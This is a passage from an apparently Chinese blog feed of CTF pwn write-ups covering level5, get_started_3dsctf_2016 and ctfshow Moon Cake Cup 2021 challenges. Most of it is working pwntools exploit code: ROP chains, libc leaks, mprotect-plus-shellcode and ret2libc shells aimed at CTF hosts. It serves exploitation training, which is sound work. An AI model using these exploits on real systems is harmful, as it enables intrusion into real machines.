href="#leve5-exp" class="headerlink" title="leve5 exp"></a>leve5 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./level3_x64'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'node4.buuoj.cn'</span>,<span class="number">26162</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">print(rop.dump())</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="number">0x88</span>*<span class="string">'1'</span>+p64(<span class="number">0x0000000004006AA</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(e.got[<span class="string">'write'</span>])+p64(<span class="number">8</span>)+p64(e.got[<span class="string">'read'</span>])+p64(<span class="number">1</span>)+p64(<span class="number">0x000000000400690</span>)+<span class="string">'s'</span>*<span class="number">8</span>*<span class="number">7</span>+p64(e.sym[<span class="string">'vulnerable_function'</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#addr=p.recvuntil('\x7f')[:-6].ljust(8,'\x00')</span></span><br><span class="line">addr=u64(p.recv(<span class="number">7</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex((addr)))</span><br><span class="line">x=finder(<span class="string">'read'</span>,addr)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">p.sendline(0x88*'1'+p64(0x00000000004006b3)+p64(x.dump('str_bin_sh'))+p64(x.dump('system')))</span></span><br><span class="line"><span class="string">#addr=0x00600000</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">rdx=<span class="number">0x00000000000cb1cd</span>+x.libcbase</span><br><span class="line">rdi=<span class="number">0x0000000000026796</span>+x.libcbase</span><br><span class="line">rsi=<span class="number">0x000000000002890f</span>+x.libcbase</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"><span class="comment">#p.sendline(0x88*'1'+p64(rdi)+p64(0x00600a00)+p64(rsi)+p64(0x100000)+p64(rdx)+p64(7)+p64(x.dump('mprotect'))+p64(rdi)+p64(0)+p64(rsi)+p64(0x00600a00)+p64(rdx)+p64(0x100)+p64(x.dump('read'))+p64(0x00600a00))</span></span><br><span class="line">p.sendline(<span class="number">0x88</span>*<span class="string">'1'</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(rsi)+p64(<span class="number">0x1000</span>)+p64(rdx)+p64(<span class="number">7</span>)+p64(x.dump(<span class="string">'mmap'</span>))+<span class="string">'1'</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#+p64(rdi)+p64(0)+p64(rsi)+p64(0x00600a00)+p64(rdx)+p64(0x100)+p64(x.dump('read'))+p64(0x00600a00))</span></span><br><span class="line"></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br></pre></td></tr></table></figure><h2 id="利用机会-get-started-3dsctf-2016"><a href="#利用机会-get-started-3dsctf-2016" class="headerlink" title="利用机会-get_started_3dsctf_2016"></a>利用机会-get_started_3dsctf_2016</h2><p>一般情况下mprotect的使用都用点画蛇添足，但是在一些静态编译的题目中就是很有用的。比如：get_started_3dsctf_2016</p><p>这道题是32位的，静态编译中ban了system，但是给mprotect了。由于没有开PIE，我们可以将可控的一段程序写入读写执行权限，然后写入后门，来得到shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   2exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/10/19 13:33:42</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./get_started_3dsctf_2016'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'node4.buuoj.cn'</span>,<span class="number">29847</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">gets=<span class="number">0x804f630</span></span><br><span class="line">edi_ret=<span class="number">0x0805099d</span></span><br><span class="line">addr=<span class="number">0x080ea900</span></span><br><span class="line">eax_ret=<span class="number">0x080b91e6</span></span><br><span class="line">ebx_ret=<span class="number">0x080481ad</span></span><br><span class="line">edx_ret=<span class="number">0x0806fc0a</span></span><br><span class="line">ret=<span class="number">0x08048196</span></span><br><span class="line">int80=<span class="number">0x0806d7e5</span></span><br><span class="line">ebx_edx_ret=<span class="number">0x0806fc09</span></span><br><span class="line">write=<span class="number">0x806e1b0</span></span><br><span class="line"><span class="comment">#0x080557ab : mov dword ptr [edx], eax ; ret</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#0x080d8443 : xchg dword ptr [edx], ecx ; ret</span></span><br><span class="line"><span class="comment">#0x08048a26 : xchg eax, ecx ; ret 交换</span></span><br><span class="line"><span class="comment">#0x08048880 : mov ebx, dword ptr [esp] ; ret</span></span><br><span class="line">ecx_write_edxaddr=<span class="number">0x080557ab</span></span><br><span class="line"><span class="comment">#p.sendline(0x38*'1'+p32(e.sym['malloc'])+p32(0x0809e4c5)+p32(0x100000)+p32(0)+p32(0)+p32(ebx_edx_ret)+p32(1)+p32(addr)+p32(ecx_write_edxaddr)+p32(e.sym['write'])+p32(e.sym['main'])+p32(1)+p32(addr)+p32(4))</span></span><br><span class="line"><span class="comment">#shelladdr=u32(p.recv(4))-8</span></span><br><span class="line"><span class="comment">#log.info(hex(shelladdr))</span></span><br><span class="line">shelladdr=<span class="number">0x080ea000</span></span><br><span class="line">ppp=<span class="number">0x0804f460</span></span><br><span class="line">p.sendline(<span class="number">0x38</span>*<span class="string">'1'</span>+p32(e.sym[<span class="string">'mprotect'</span>])+p32(<span class="number">0x0809e4c5</span>)+p32(shelladdr)+p32(<span class="number">0x200</span>)+p32(<span class="number">7</span>)+p32(e.sym[<span class="string">'gets'</span>])+p32(ret)+p32(shelladdr))</span><br><span class="line">debug()</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line"><span class="comment">#p.sendline(asm(shellcraft.sh()))</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-月饼杯2021-pwn-wp</title>
      <link href="/2021/09/21/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF-pwn-wp/"/>
      <url>/2021/09/21/ctfshow-%E6%9C%88%E9%A5%BC%E6%9D%AF-pwn-wp/</url>
      
        <content type="html"><![CDATA[<p>久违参加了ctfshow的比赛，题都比较简单，就是远程环境libc我泄露半天才泄露出来… (⊙﹏⊙) <a id="more"></a></p><h2 id="简单的胖"><a href="#简单的胖" class="headerlink" title="简单的胖"></a>简单的胖</h2><p>题目简单就一个简单amd64位的栈溢出.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's your name? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  v6 = v3;</span><br><span class="line">  buf[v3 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome to the CTFshow Moon cake cup! %s!\n"</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看下保护只开了NX.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>先一波正常栈溢出,通过<code>printf</code>函数泄露出libc的真实地址和libc版本.</p><p>(但这里远程环境libc 版本,我之前泄露libc死活泄露不出来,看了第二题的libc才猜测两题环境可能一样,tcl)</p><p>然后再通过一波栈溢出getshell.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/09/20 15:40:41</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./moonpwn01'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28075</span>]</span><br><span class="line"><span class="comment">#GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.</span></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x00000000004006fc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006fe : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400700 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400702 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006fb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006ff : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400578 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400703 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400701 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006fd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004004ce : ret </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">rdi_ret=<span class="number">0x0000000000400703</span></span><br><span class="line">ret=<span class="number">0x00000000004004ce</span> </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">0x28</span>+p64(ret)+p64(rdi_ret)+p64(e.got[<span class="string">'printf'</span>])+p64(e.sym[<span class="string">'printf'</span>])+p64(e.sym[<span class="string">'_start'</span>]))</span><br><span class="line"></span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(hex(addr))</span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'printf'</span>,addr) <span class="comment">#Ubuntu GLIBC 2.27-3ubuntu1</span></span><br><span class="line"><span class="comment">#p.sendline('1'*0x28+p64(rdi_ret)+p64(0x601100)+p64(x.dump('gets'))+p64(rdi_ret)+p64(0x601100)+p64(x.dump('puts'))+p64(rdi_ret)+p64(0x601100)+p64(ret)+p64(x.dump('system'))+p64(e.sym['_start']))</span></span><br><span class="line"><span class="comment">#p.sendline('/bin/sh\x00')</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">0x28</span>+p64(rdi_ret)+p64(x.dump(<span class="string">'str_bin_sh'</span>))+p64(ret)+p64(x.dump(<span class="string">'system'</span>))+p64(e.sym[<span class="string">'_start'</span>]))</span><br><span class="line">debug()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="容易的胖"><a href="#容易的胖" class="headerlink" title="容易的胖"></a>容易的胖</h2><p>题目是i386(32位)题目,先看来下了保护发现不仅什么没开.还有读写执行权限(喜).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>审计下题目代码,发现通过fgets函数用我们可以写入至多256个字节长度的shellcode.</p><p>同时,<code>read(0, &amp;s, 0x14u);</code>触有栈溢出但只能让我们溢出到<code>edp</code>.</p><p>加上,有<code>strcmp(&amp;s, &quot;yes\n&quot;)</code>判断需要我们bypass.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> *v3; <span class="comment">// [esp+10h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;a1;</span><br><span class="line">  sub_80485A6();</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(::s, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your shellcode"</span>);</span><br><span class="line">  fgets(::s, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you know how to use shellcode????"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;s, <span class="string">"yes\n"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you may be need learn it"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"ok,good"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过<code>yes\n\x00</code>+code的方法来绕过strcmp函数。同时，由于题目没有开NX与PIE，因此我们可以通过ida静态分析出通过fgets函数写入的shellcode存放到<code>0x804a040</code>。</p><p>因此我们可以通过栈溢出控制<code>edp</code>，再通过栈特性间接控制<code>eip</code>，在让让<code>eip</code>指向我们shellcode的地址，从而getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/09/20 16:41:27</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./moonpwn02'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=<span class="string">'i386'</span></span><br><span class="line">ip_port=[<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28157</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(p32((<span class="number">0x804a040</span>+<span class="number">4</span>))+asm(shellcraft.sh()))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#print(hex(len(pay)))</span></span><br><span class="line">p.sendline(<span class="string">'yes\n\x00'</span>+<span class="string">'\x00'</span>*<span class="number">3</span>+<span class="string">'\x00'</span>*<span class="number">0x8</span>+p32(<span class="number">0x804a040</span>+<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Moon-note"><a href="#Moon-note" class="headerlink" title="Moon_note"></a>Moon_note</h2><p>题目所有保护全开，是个堆题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>题目主要分为creat_notetitle,creat_content,show_content,delet_content_title.</p><p>题目主要问题出现在free chunk功能函数处：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Title of note to delete: "</span>);</span><br><span class="line">  getnline(&amp;v2, <span class="number">16L</span>L);</span><br><span class="line">  ptr = find_note(&amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)(*((_QWORD *)ptr + <span class="number">2</span>) + <span class="number">24L</span>L) = *((_QWORD *)ptr + <span class="number">3</span>);</span><br><span class="line">    *(_QWORD *)(*((_QWORD *)ptr + <span class="number">3</span>) + <span class="number">16L</span>L) = *((_QWORD *)ptr + <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr + <span class="number">4</span>)); <span class="comment">//没有清空内容</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//没有note titile chunk清空内容</span></span><br><span class="line">    --<span class="built_in">size</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于在free时没有清空残余内容，导致uaf存在。</p><p>通过notetitle chunk free后，再add 仍指向content chunk .从而通show函数泄露出content chunk addr。</p><p>同时，经过测试libc版本低于2.29。因此还可以利用这free chunk 功能函数制造content chunk  double free。</p><p>从而让content chunk 错位改造出大于0x420的chunk 头，free掉构造出unsorted bin，从而泄露出libc。</p><p>然后通过<code>__free_hook</code>getshell。</p><p>（ps：这里偏移很奇怪，我原来本地libc2.27泄露出来unsorted bin addr 到<code>main_arena</code>为88 字节，然而远程环境为96）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 